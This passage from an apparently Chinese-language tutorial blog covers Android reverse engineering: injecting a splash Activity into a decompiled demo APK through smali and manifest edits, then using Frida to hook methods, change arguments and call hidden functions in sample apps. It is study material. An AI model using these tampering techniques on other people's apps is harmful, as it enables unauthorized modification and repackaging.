class="class">Landroid/content/Intent;</span>-&gt;&lt;init&gt;(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/Class;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0&#125;, <span class="class">Landroid/content/Context;</span>-&gt;startActivity(<span class="class">Landroid/content/Intent;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onCreateOptionsMenu(<span class="class">Landroid/view/Menu;</span>)Z</span><br><span class="line"><span class="keyword">    .registers</span> 3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-super </span>&#123;p0, p1&#125;, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span>-&gt;onCreateOptionsMenu(<span class="class">Landroid/view/Menu;</span>)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onOptionsItemSelected(<span class="class">Landroid/view/MenuItem;</span>)Z</span><br><span class="line"><span class="keyword">    .registers</span> 3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-super </span>&#123;p0, p1&#125;, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span>-&gt;onOptionsItemSelected(<span class="class">Landroid/view/MenuItem;</span>)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return </span>v0<span class="keyword"></span></span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></div></figure>

<p>对应java代码为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my);</span><br><span class="line"></span><br><span class="line">        handler = <span class="keyword">new</span> Handler();</span><br><span class="line">        handler.postDelayed(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MyActivity.<span class="keyword">this</span>, MainActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">                finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">5000</span>); <span class="comment">// 5秒后跳转</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>找到apk中的存放activity的位置，放入myActivity，这个包里的路径为：<code>教程demo(更新)\smali\com\zj\wuaipojie\ui</code></p>
<p>然后添加布局文件hello_word.xml，放到<code>教程demo(更新)\res\layout\</code>下</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 声明 XML 文件版本和编码方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- RelativeLayout 布局，定义根布局。--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/text_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerInParent</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Hello World!&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;24sp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- TextView 组件，显示文本。--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- RelativeLayout 布局结束。--&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>添加布局文件，那么还需要添加布局文件的的资源ID，在<code>教程demo(更新)\smali\com\zj\wuaipojie\R$layout.smali</code>文件中添加如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240105095827763.png" alt="image-20240105095827763"></p>
<p>需要确保这个id，即<code>0x7f0b007e</code>在<code>教程demo(更新)\res\values\public.xml</code>中是没有的，然后在对应layout标签的最下面添加即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240105100010298.png" alt="image-20240105100010298"></p>

        <h3 id="c-声明Activity并默认启动"   >
          <a href="#c-声明Activity并默认启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#c-声明Activity并默认启动" class="headerlink" title="c)声明Activity并默认启动"></a>c)声明Activity并默认启动</h3>
      <p>修改AndroidManifest.xml，将myActivity设置为主Activity</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/imagse-20240105102042503.png" alt="image-20240105102042503"></p>
<p>使用apktool进行编译，<code>apktool b xxx -o xxx</code>，提示如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240105102136469.png" alt="image-20240105102136469"></p>
<p>换成最新版本的可以成功，或者用AndroidKiller，替换一下apktool就行，但是不要改脚本，改apktool的文件名就可以。</p>

        <h3 id="d-签名"   >
          <a href="#d-签名" class="heading-link"><i class="fas fa-link"></i></a><a href="#d-签名" class="headerlink" title="d)签名"></a>d)签名</h3>
      <p>正常签名</p>
<p>完成之后，安装</p>

        <h1 id="Frida逆向与抓包实战"   >
          <a href="#Frida逆向与抓包实战" class="heading-link"><i class="fas fa-link"></i></a><a href="#Frida逆向与抓包实战" class="headerlink" title="Frida逆向与抓包实战"></a>Frida逆向与抓包实战</h1>
      <p>参考的书《Frida逆向与抓包实战》</p>

        <h2 id="环境安装"   >
          <a href="#环境安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2>
      <p>还是用<code>bluestacks5</code>，版本为<code>android9</code>，<code>bluestacks.conf</code>不要设置只读，不然<code>adb</code>的端口也被固定，这样<code>windows</code>启动之后说不定就占了这个端口，这样就不太行了。</p>
<p>然后<code>windows</code>安装对应的<code>python、frida、frida-tools</code>即可，这里用的是<code>python3.8.0</code></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br></pre></td></tr></table></div></figure>

<p>然后在<code>github</code>的<code>frida</code>下载对应版本架构的<code>server</code>，可以通过<code>adb</code>进入模拟器输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.product.cpu.abi</span><br></pre></td></tr></table></div></figure>

<p>查看架构，这里是<code>x86_64</code>的，那么下载如下的<code>frida-server</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925110525614.png" alt="image-20230925110525614"></p>
<p>之后将<code>frida-server</code>放入模拟器的<code>/data/local/tmp</code>中赋予权限运行即可。</p>
<p>然后在<code>windows</code>下<code>frida</code>运行即可<code>hook</code>，有点类似<code>gdb</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l .\Chap03\2.js com.example.fridapro</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925110704618.png" alt="image-20230925110704618"></p>

        <h2 id="Frida基础知识"   >
          <a href="#Frida基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#Frida基础知识" class="headerlink" title="Frida基础知识"></a>Frida基础知识</h2>
      
        <h3 id="HelloWorld"   >
          <a href="#HelloWorld" class="heading-link"><i class="fas fa-link"></i></a><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h3>
      <p>最基础的注入，使用如下<code>js</code>脚本</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure>

<p>对应注入命令</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hello.js android.process.media</span><br></pre></td></tr></table></div></figure>

<p>其中<code>-U</code>为<code>USB</code>设备，<code>-l</code>用于指定注入脚本路径，将代码注入到<code>android.process.media</code>这个进程中，即可打印出<code>hello world!</code>。</p>

        <h3 id="HOOK基础"   >
          <a href="#HOOK基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#HOOK基础" class="headerlink" title="HOOK基础"></a>HOOK基础</h3>
      <p>对应<code>java</code>代码编写的<code>app</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fridapro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即使用<code>fun</code>函数循环打印<code>r0ysue.sum</code>以及算数和，那么就可以使用<code>frida</code>对这个<code>fun</code>函数进行<code>HOOK</code>，如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Script loaded successfully &quot;</span>)</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Inside java perform function&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过java.use获取包主类</span></span><br><span class="line">        <span class="keyword">var</span> MainAcitivity = Java.use(<span class="string">&#x27;com.example.fridapro.MainActivity&#x27;</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Java.Use.Successfully!&quot;</span>) <span class="comment">//定位类成功！</span></span><br><span class="line">        <span class="comment">// hook 重载函数，这里不用overload也可以</span></span><br><span class="line">        <span class="comment">//但是最好还是指定一下</span></span><br><span class="line">        MainAcitivity.fun.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;orignal args: x =&gt; &quot;</span>,x,<span class="string">&quot;, y =&gt; &quot;</span>,y)</span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="built_in">this</span>.fun(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">return</span> ret_value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></div></figure>

<p>然后在模拟器中运行<code>app</code>，<code>windows</code>中对应的命令也是类似的，指定一下进程名即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l 1.js com.example.fridapro</span><br></pre></td></tr></table></div></figure>

<p>使用<code>adb logcat</code>查看即可发现函数参数被修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925113535171.png" alt="image-20230925113535171"></p>

        <h3 id="主动调用函数"   >
          <a href="#主动调用函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#主动调用函数" class="headerlink" title="主动调用函数"></a>主动调用函数</h3>
      <p>可以使用<code>Frida</code>对<code>APP</code>中没有被调用的函数进行主动调用</p>
<p>例子<code>APP</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fridapro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.secret&quot;</span> , <span class="string">&quot;this is secret func&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">staticSecret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.secret&quot;</span> , <span class="string">&quot;this is static secret func&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>加入了<code>secrect</code>相关函数，其中一个是全局静态的。</p>
<p>对应主动调用的<code>Frida</code>相关的代码如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Script loaded successfully &quot;</span>)</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Inside java perform function&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> MainAcitivity = Java.use(<span class="string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 静态函数主动调用,比较简单</span></span><br><span class="line">        MainAcitivity.staticSecret();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 会报错Error: secret: cannot call instance method without an instance</span></span><br><span class="line">        <span class="comment">//MainAcitivity.secret();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态函数主动调用</span></span><br><span class="line">        Java.choose(<span class="string">&#x27;com.example.fridapro.MainActivity&#x27;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;instance found&#x27;</span>,instance)</span><br><span class="line">                instance.secret()</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;search Complete&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></div></figure>

<p>运行之后，查看<code>adb logcat</code>即可看到<code>secrect</code>函数被调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925155340657.png" alt="image-20230925155340657"></p>
<p>如果直接运行<code>MainAcitivity.secret();</code>，则会出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230925155517808.png" alt="image-20230925155517808"></p>

        <h3 id="RPC自动化"   >
          <a href="#RPC自动化" class="heading-link"><i class="fas fa-link"></i></a><a href="#RPC自动化" class="headerlink" title="RPC自动化"></a>RPC自动化</h3>
      <p>可以使用<code>python</code>脚本完成<code>js</code>脚本对进程的注入以及<code>hook</code>。</p>
<p>例子<code>APP</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fridapro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String total = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        total += <span class="string">&quot; secretFunc&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.secret&quot;</span> , <span class="string">&quot;this is secret func&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">staticSecret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;r0ysue.secret&quot;</span> , <span class="string">&quot;this is static secret func&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在<code>secrect</code>函数中加入了对<code>total</code>属性进行处理的操作。在使用时，如果是<code>static</code>的变量，则直接类加变量名即可获取。如果是类里面的属性变量，则如下代码，也是需要获取类实例才可以的。</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTotalValue</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> MainAcitivity = Java.use(<span class="string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态函数主动调用</span></span><br><span class="line">        Java.choose(<span class="string">&#x27;com.roysue.demo02.MainActivity&#x27;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;total value = &#x27;</span>,instance.total.value)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;search 